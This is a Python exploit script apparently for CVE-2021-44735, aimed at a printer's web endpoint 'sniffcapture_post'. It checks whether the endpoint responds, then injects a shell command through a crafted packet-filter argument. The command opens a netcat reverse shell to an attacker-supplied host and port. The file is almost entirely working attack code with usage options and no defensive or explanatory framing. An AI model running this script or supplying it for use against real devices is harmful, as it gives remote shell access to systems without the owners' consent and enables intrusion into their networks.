#!/usr/bin/python3

import sys
import getopt
import requests

usage_string = "Usage: python cve-2021-44735.py -r <rhost> -l <lhost> -p <lport>"


def endpoint_exists(ip):
    api_url = f"http://{ip}/cgi-bin/sniffcapture_post"

    response = ""
    try:
        response = requests.get(api_url, timeout=1)
    except requests.exceptions.ConnectionError:
        print(f"Target's ({ip}) http interface is not available.")
        return False
    except requests.exceptions.ReadTimeout:
        print(f"Target's ({ip}) http interface is not responding.")
        return False

    if response.status_code != 200:
        print(f"Target's api url '{api_url}' is not available.")
        return False

    return True


def attack(rhost, lhost, lport):
    api_url = f"http://{rhost}/cgi-bin/sniffcapture_post"

    payload = (
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    )

    filter = r"filter test\"; " + payload + r";\""
    body = f'-i eth0 -F "{filter}"'

    # send request and not wait for response
    try:
        requests.post(api_url, data=body, timeout=1)
    except requests.exceptions.ReadTimeout:
        pass


def main(argv):
    rhost = None
    lhost = None
    lport = None
    try:
        opts, args = getopt.getopt(argv, "hr:l:p:")
    except getopt.GetoptError:
        print(usage_string)
        sys.exit(1)
    for opt, arg in opts:
        if opt == "-h":
            print(usage_string)
            sys.exit()
        elif opt == "-r":
            rhost = arg
        elif opt == "-l":
            lhost = arg
        elif opt == "-p":
            lport = arg

    if rhost is None or lhost is None or lport is None:
        print(usage_string)
        sys.exit(1)

    # Check target printer vulnerable HTTP endpoint
    if endpoint_exists(rhost):
        input(f"Start listener on the {lhost}:{lport} and press Enter to continue")
    else:
        print("Exploitation failed!")
        exit(2)

    print("Sending exploit...")
    attack(rhost, lhost, lport)
    print("Exploit sent, check listener")


if __name__ == "__main__":
    main(sys.argv[1:])
